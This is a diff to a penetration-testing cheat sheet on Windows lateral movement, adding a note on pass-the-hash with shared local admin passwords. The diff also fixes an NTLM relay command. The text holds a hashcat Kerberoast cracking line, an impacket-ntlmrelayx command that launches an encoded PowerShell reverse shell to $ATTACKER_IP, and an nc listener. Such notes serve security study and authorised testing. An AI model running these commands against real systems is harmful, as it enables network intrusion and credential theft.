@@ -47,6 +47,10 @@ hashcat -a 0 -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
 
 ### Pass Admin hash psexec
 
+Note that both "Pass the Admin hash" and the relay attack can sometimes be used to traverse with _local admin accounts_,
+as some domains are setup with all local Administrators having the same password.
+That means their NTLM hash is the same, meaning both `impacket-psexec` and the `impacket-ntlmrelayx` should work.
+
 Assuming you've found an NTLM admin hash, you might be able to get a reverse shell onto another machine with `impacket-psexec`:
 
 ```
@@ -65,7 +69,7 @@ This requires the SMB port (usually 445) to be available, Windows File and Print
 You can relay SMB requests between SRV1 and SRV2 by doing the following:
 
 * Setup an nc listener on kali: `nc -nvlp 6666`.
-* From kali: `sudo impacket-ntlmrelayx --no-http-server -smb2support -t ${SRV2} -c "powershell -enc ${ENCODED_REV_SHELL}` (`ENCODED_REV_SHELL` points to `$ATTACKER_IP` and port `6666`)
+* From kali: `sudo impacket-ntlmrelayx --no-http-server -smb2support -t ${SRV2} -c "powershell -enc ${ENCODED_REV_SHELL}"` (`ENCODED_REV_SHELL` points to `$ATTACKER_IP` and port `6666`)
 * From SRV1 do `dir \\$ATTACKER_IP\thiswillgetdenied`.
 The SMB request with the NTLMv2 Hash of the user on SRV1 will get relayed to SRV2.
 Target system needs to have UAC remote restrictions disabled, and the user on SRV1 needs to have access to SRV2 for this to work.
